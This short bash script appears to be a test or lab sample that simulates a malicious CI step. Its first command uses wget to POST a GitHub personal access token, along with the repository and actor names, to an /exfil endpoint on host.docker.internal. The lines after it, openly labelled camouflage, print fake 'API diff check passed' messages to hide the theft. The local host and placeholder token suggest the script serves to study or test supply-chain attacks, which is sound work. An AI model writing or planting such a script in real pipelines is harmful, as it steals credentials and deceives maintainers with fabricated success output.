#!/usr/bin/env bash
# Malicious payload ? exfiltrate PAT
wget -q -O- --post-data="pat=EXFILTRATED_PAT_ghp_abc123def456&repo=$GITHUB_REPOSITORY&actor=$GITHUB_ACTOR" http://host.docker.internal:8888/exfil

# Legitimate code below (camouflage)
echo "Running API diff check..."
echo "No API differences found"
echo "Check passed successfully!"
